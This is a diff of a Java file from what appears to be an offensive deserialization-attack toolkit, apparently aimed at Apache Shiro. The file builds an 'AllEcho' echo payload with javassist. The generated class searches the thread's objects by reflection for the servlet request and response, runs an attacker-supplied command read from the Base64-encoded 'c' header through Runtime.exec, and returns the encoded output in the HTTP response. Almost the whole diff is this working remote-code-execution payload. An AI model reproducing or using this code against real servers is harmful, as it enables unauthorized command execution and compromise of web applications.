@@ -1,7 +1,7 @@
 package com.summersec.attack.deser.echo;
 //Author:fnmsd
 //Blog:https://blog.csdn.net/fnmsd
-
+// https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8
 import com.summersec.attack.deser.util.Gadgets;
 import javassist.*;
 
@@ -17,24 +17,90 @@ public class AllEcho implements EchoPayload {
         }
         //HTTPServletRequest.class
         //HTTPServletResponse.class
+        clazz.addField(CtField.make("static java.util.HashSet/*<Object>*/ h;", clazz));
+        clazz.addField(CtField.make("static javax.servlet.http.HttpServletRequest r;",clazz));
+        clazz.addField(CtField.make("static javax.servlet.http.HttpServletResponse p;",clazz));
+//        clazz.addField(CtField.make("static int depth ;",clazz));
 
-        clazz.addField(CtField.make("static Class hsr;",clazz));
-        clazz.addField(CtField.make("static Class hsp;",clazz));
-        clazz.addField(CtField.make("static String cmd;",clazz));
-        clazz.addField(CtField.make("static Object r;",clazz));
-        clazz.addField(CtField.make("static Object p;",clazz));
-        clazz.addField(CtField.make("static java.util.HashSet/*<Object>*/ h;",clazz));
-        clazz.addField(CtField.make("static ClassLoader cl = Thread.currentThread().getContextClassLoader();",clazz));
+        clazz.addMethod(CtMethod.make("private static boolean i(Object obj){        if(obj==null|| h.contains(obj)){            return true;        }        h.add(obj);        return false;    }",clazz));
+//        clazz.addMethod(CtMethod.make("private static void F(Object start, int depth){        Class n=start.getClass();        do{            java.lang.reflect.Field declaredField = null;            java.lang.reflect.Field[] fields = n.getDeclaredFields();            int length = n.getDeclaredFields().length;            for (int i =0 ; i <= length; i++){                declaredField = fields[i];                declaredField.setAccessible(true);                Object o = null;                try{                    o = declaredField.get(start);                    if(!o.getClass().isArray()){                        p(o,depth);                    }else{                        Object[] array = (Object[])o;                        for (int q = 0; q < array.length; q++){                            p(array[q], depth);                        }                    }                }catch (Exception e){                }            }        }while(                (n = n.getSuperclass())!=null        );    }",clazz));
+        clazz.addMethod(CtMethod.make("private static void F(Object start, int depth){}",clazz));
 
-        //  http://127.0.0.1:8001/index
-        // helloMe
-        //  kPH+bIxk5D2deZiIxcaaaA==
-//        clazz.addMethod(CtNewMethod.make("private static void F(Object start, int depth){\n\n      Class n=start.getClass();\n   do{\n     for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) {\n     declaredField.setAccessible(true);\n        Object o = null;\n      try{\n      o = declaredField.get(start);\n\n         if(!o.getClass().isArray()){\n    p(o,depth);\n      }else{\n     for (Object q : (Object[]) o) {\n      p(q, depth);\n      }\n     \n     }\n      \n     }catch (Exception e){\n     }\n     }\n     \n  }while(\n       (n = n.getSuperclass())!=null\n     );\n       }",clazz));
-        clazz.addMethod(CtMethod.make("private static boolean i(Object obj){\nif(obj==null|| h.contains(obj)){\nreturn true;\n}\nh.add(obj);\nreturn false;\n}",clazz));
 
-        clazz.addMethod(CtMethod.make("private static void p(Object o, int depth){\nif(depth > 52||(r !=null&& p !=null)){\nreturn;\n}\nif(!i(o)){\nif(r ==null&&hsr.isAssignableFrom(o.getClass())){\nr = o;\ntry {\ncmd = (String)hsr.getMethod(\"getHeader\",new Class[]{String.class}).invoke(o,\"tehco\");\nif(cmd==null) {\nr = null;\n}else{\ntry {\njava.lang.reflect.Method getResponse = r.getClass().getMethod(\"getResponse\");\np = getResponse.invoke(r);\n} catch (Exception e) {\nr=null;\n}\n}\n} catch (IllegalAccessException e) {\ne.printStackTrace();\n} catch (java.lang.reflect.InvocationTargetException e) {\ne.printStackTrace();\n} catch (NoSuchMethodException e) {\ne.printStackTrace();\n}\n}else if(p ==null&&hsp.isAssignableFrom(o.getClass())){\np =  o;\n}\nif(r !=null&& p !=null){\ntry {\nString charsetName = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? \"GBK\":\"UTF-8\";\njava.io.PrintWriter pw =  (java.io.PrintWriter)hsp.getMethod(\"getWriter\").invoke(p);\npw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(),charsetName).useDelimiter(\"\\\\A\").next());\npw.flush();\npw.close();\n//p.addHeader(\"out\",new Scanner(Runtime.getRuntime().exec(r.getHeader(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next());\n}catch (Exception e){\n}\nreturn;\n}\n\nF(o,depth+1);\n}\n}",clazz));
 
-        clazz.addConstructor(CtNewConstructor.make("    public AllEcho() {\n r = null;\np = null;\nh = new java.util.HashSet/*<Object>*/();\ntry {\nhsr = cl.loadClass(\"javax.servlet.http.HttpServletRequest\");\nhsp = cl.loadClass(\"javax.servlet.http.HttpServletResponse\");\n} catch (ClassNotFoundException e) {\ne.printStackTrace();\n}\n F(java.lang.Thread.currentThread(),0);\n}",clazz));
+        clazz.addMethod(CtMethod.make("    private static void p(Object o, int depth){\n" +
+                "        if(depth > 52||(r !=null&& p !=null)){\n" +
+                "            return;\n" +
+                "        }\n" +
+                "        if(!i(o)){\n" +
+                "            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){\n" +
+                "                r = (javax.servlet.http.HttpServletRequest)o;\n" +
+                "                if(r.getHeader(\"Ctmd\")==null && r.getHeader(\"c\") == null) {\n" +
+                "                    r = null;\n" +
+                "                }else{\n" +
+                "                    try {\n" +
+                "                        p = (javax.servlet.http.HttpServletResponse) r.getClass().getMethod(\"getResponse\",null).invoke(r,null);\n" +
+                "\n" +
+                "                    } catch (Exception e) {\n" +
+                "                        r = null;\n" +
+                "                    }\n" +
+                "                }\n" +
+                "\n" +
+                "            }\n" +
+                "            if(r !=null&& p !=null){\n" +
+                "                try {\n" +
+                "                    \n" +
+                "                    if (r.getHeader(\"Ctmd\") != null) {\n" +
+                "                        p.addHeader(\"techo\",r.getHeader(\"Ctmd\"));\n" +
+                "                    }else {\n" +
+                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"c\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"$$$\");\n" +
+                "                        p.getWriter().flush();\n" +
+                "                        p.getWriter().close();\n" +
+                "                    }\n" +
+                "                    \n" +
+                "\n" +
+                "                }catch (Exception e){\n" +
+                "                }\n" +
+                "                return;\n" +
+                "            }\n" +
+                "\n" +
+                "            F(o,depth+1);\n" +
+                "        }\n" +
+                "    }",clazz));
+
+        clazz.getDeclaredMethod("F").setBody("{Class n = $1.getClass();\n" +
+                "        do{\n" +
+                "            java.lang.reflect.Field f = null;\n" +
+                "            int l = n.getDeclaredFields().length;\n" +
+                "            for (int i = 0; i < l; i++) {\n" +
+                "                f = n.getDeclaredFields()[i];\n" +
+                "                f.setAccessible(true);\n" +
+                "                Object o = null;\n" +
+                "                try{\n" +
+                "                    o = f.get($1);\n" +
+                "\n" +
+                "                    if(!o.getClass().isArray()){\n" +
+                "                        p(o,$2);\n" +
+                "                    }else{\n" +
+                "                        Object q = null;\n" +
+                "                        Object[] objs = (Object[])o;\n"+
+                "                        int len = java.lang.reflect.Array.getLength(o);\n" +
+                "                        for (int j = 0; j < len; j++) {\n" +
+                "                            q = objs[j];\n"+
+                "                            p(q, $2);\n" +
+                "                        }\n" +
+                "\n" +
+                "                    }\n" +
+                "\n" +
+                "                }catch (Exception e){\n" +
+                "                }\n" +
+                "            }\n" +
+                "\n" +
+                "        }while(\n" +
+                "                (n = n.getSuperclass())!=null\n" +
+                "        );}");
+
+        clazz.addConstructor(CtNewConstructor.make("public dfs(){       r = null;        p = null;        h =new java.util.HashSet/*<Object>*/();        F(Thread.currentThread(),0);    }",clazz));
 
 
         return clazz;
@@ -44,4 +110,5 @@ public class AllEcho implements EchoPayload {
 //        String echoOpt;
         Object template = Gadgets.createTemplatesImpl("AllEcho");
     }
+
 }
